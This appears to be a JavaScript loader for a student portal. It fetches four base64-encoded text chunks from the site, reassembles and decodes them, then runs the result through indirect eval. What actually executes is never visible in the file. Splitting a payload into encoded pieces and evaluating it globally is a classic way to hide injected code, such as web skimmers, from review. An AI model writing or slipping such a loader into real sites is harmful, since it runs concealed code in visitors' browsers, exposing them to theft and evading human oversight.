/** Student portal — b64 parts loader */
(function () {
  var n = 4, loaded = 0, parts = [];
  function go() {
    if (loaded < n) return;
    try {
      var bin = parts.map(function (b) {
        var s = atob(b);
        var u = new Uint8Array(s.length);
        for (var i = 0; i < s.length; i++) u[i] = s.charCodeAt(i);
        return u;
      });
      var total = bin.reduce(function (a, x) { return a + x.length; }, 0);
      var out = new Uint8Array(total), o = 0;
      bin.forEach(function (u) { out.set(u, o); o += u.length; });
      var code = new TextDecoder('utf-8').decode(out);
      (0, eval)(code);
    } catch (e) {
      console.error('student load', e);
    }
  }
  for (var i = 0; i < n; i++) {
    (function (idx) {
      fetch('/_st_b64_' + idx + '.txt?v=' + Date.now())
        .then(function (r) { if (!r.ok) throw new Error(r.status); return r.text(); })
        .then(function (t) { parts[idx] = t.replace(/\s+/g, ''); loaded++; go(); })
        .catch(function (e) { console.error(e); });
    })(i);
  }
})();
